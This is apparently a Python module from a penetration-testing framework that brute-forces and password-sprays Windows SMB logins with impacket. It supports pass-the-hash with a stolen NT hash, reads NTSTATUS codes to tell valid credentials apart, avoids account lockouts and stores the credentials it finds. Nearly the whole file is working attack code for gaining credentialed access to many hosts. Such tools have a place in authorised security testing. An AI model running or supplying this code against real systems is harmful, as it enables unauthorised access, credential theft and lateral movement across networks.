"""SMB login brute force / spray (impacket), with pass-the-hash.

SMB is the highest-signal place to validate Windows creds: a hit works
against file shares, smb_exec, WMI — everything in the SMB toolchain.
Each attempt is a real NTLM session setup, so the verdicts are exact:

  - LOGON_FAILURE       -> wrong cred (the common case)
  - PASSWORD_EXPIRED    -> VALID cred, password must change (counted good)
  - ACCOUNT_DISABLED    -> valid password, dead account (not counted)
  - ACCOUNT_LOCKED_OUT  -> stop touching this host NOW (lockout policy
                           is real; continuing makes it worse)

Lockout discipline: the first ACCOUNT_LOCKED_OUT short-circuits the rest
of the host's combos and the module says so loudly. A dead host (3
consecutive transport errors) gets the same circuit-breaker — spraying a
CIDR means mostly-dead endpoints, and they shouldn't cost retries.

NTHASH sprays pass-the-hash style: one hash in place of passwords
(the classic "compromised local admin hash, many hosts" play).
"""

import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptInt, OptPort, OptString
from core.wordlists import build_combos, creds_from_options

try:
    from impacket.smbconnection import SMBConnection, SessionError
except ImportError:
    SessionError = None  # console gates run() on requirements

# NTSTATUS codes worth a distinct verdict (the rest collapse to fail/error)
STATUS_LOGON_FAILURE = 0xC000006D
STATUS_PASSWORD_EXPIRED = 0xC0000071
STATUS_PASSWORD_MUST_CHANGE = 0xC0000224
STATUS_ACCOUNT_DISABLED = 0xC0000072
STATUS_ACCOUNT_LOCKED_OUT = 0xC0000234

ERROR_CIRCUIT = 3  # consecutive transport errors before a host is skipped


def classify_status(code):
    """NTSTATUS -> (verdict, note). Verdicts: success, fail, locked."""
    if code in (STATUS_PASSWORD_EXPIRED, STATUS_PASSWORD_MUST_CHANGE):
        return "success", "valid, password expired/must change"
    if code == STATUS_ACCOUNT_LOCKED_OUT:
        return "locked", "account locked out"
    if code == STATUS_ACCOUNT_DISABLED:
        return "fail", "valid password, account disabled"
    return "fail", ""


class SmbLogin(AuxiliaryModule):
    name = "SMB Login Brute Force"
    description = """
        Tries username/password combinations over SMB session setup —
        DOMAIN='.' for local accounts, the AD domain for domain creds.
        NTHASH replaces passwords for pass-the-hash sprays. Stored creds
        for the host are tried first. ACCOUNT_LOCKED_OUT or a dead host
        circuit-breaks the remaining attempts immediately. Verifies with
        a real session setup, so a 'valid' result works for shares,
        smb_exec, and everything else SMB.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local accounts)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username(s), comma-separated"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex — replaces passwords "
                                               "(pass-the-hash spray)"))
        self.options.add(OptInt("THREADS", default=2,
                                description="Concurrent attempts (keep low: lockouts)"))
        self.options.add(OptInt("TIMEOUT", default=5, description="Connect timeout (seconds)"))
        self.options.add(OptBool("STOP_ON_SUCCESS", default=True,
                                 description="Stop after the first valid credential"))

    def _try(self, host, port, timeout, domain, nthash, state,
             user, password):
        """One session setup -> success | fail | error; side-effects the
        per-host circuit breakers (state dict) on lockout/dead-host."""
        if state["abort"]:
            return None  # circuit open: burn the combo silently
        conn = SMBConnection(host, host, sess_port=port, timeout=timeout)
        try:
            if nthash:
                conn.login(user, "", domain, "", nthash)
            else:
                conn.login(user, password, domain)
            return "success", "valid"
        except SessionError as e:
            code = e.getErrorCode()
            verdict, note = classify_status(code)
            if verdict == "locked":
                state["abort"] = True
                state["locked"] = f"{domain}\\{user}"
            return verdict, note or f"0x{code:08x}"
        except (OSError, EOFError) as e:
            state["errors"] += 1
            if state["errors"] >= ERROR_CIRCUIT:
                state["abort"] = True
                state["dead"] = str(e)
            self.print_debug(f"{host}:{port} {user} -> transport: {e}")
            return "error", str(e)
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def run(self):
        try:
            raw_users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        # usernames comma-split (sprays need lists inline); passwords never
        # do — commas are legal password characters
        users = [u.strip() for v in raw_users for u in v.split(",") if u.strip()]
        nthash = str(self.get_option("NTHASH") or "").strip()
        if nthash:
            passwords = [nthash]
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE, or NTHASH)")
            return

        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} secret(s) = "
            f"{len(combos)} combinations"
            + (" (pass-the-hash)" if nthash else ""))
        port = int(self.get_option("RPORT"))
        timeout = int(self.get_option("TIMEOUT"))
        domain = str(self.get_option("DOMAIN") or ".")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, port, timeout, domain, nthash, combos)

    def _attack_host(self, host, port, timeout, domain, nthash, combos):
        store = getattr(self.framework, "store", None)
        if store is not None and not nthash:
            stored = store.creds_for(host, "smb")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first")
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        state = {"abort": False, "errors": 0, "locked": None, "dead": None}
        attempt = lambda u, p: self._try(host, port, timeout, domain,  # noqa: E731
                                         nthash, state, u, p)
        classify = lambda verdict: verdict[0] if verdict[0] != "locked" else "error"  # noqa: E731

        def on_success(combo, result):
            note = f" ({result[1]})" if result[1] != "valid" else ""
            self.print_good(f"{host}: valid credential "
                            f"{domain}\\{combo[0]}:{combo[1]}{note}")

        started = time.time()
        found, attempts, errors, possibles = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        if state["locked"]:
            self.print_warning(
                f"{host}: ACCOUNT_LOCKED_OUT on {state['locked']} — "
                f"remaining combos skipped (lockout policy is live)")
        if state["dead"]:
            self.print_warning(
                f"{host}: {ERROR_CIRCUIT} consecutive transport errors "
                f"({state['dead']}) — host skipped")
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors")

        if store is not None and found:
            store.add_service(host, port, name="smb")
            for user, pw in found:
                store.add_cred(host, "smb", user, pw, source="smb-brute")
                self.print_status("Credential saved ('creds' to view)")
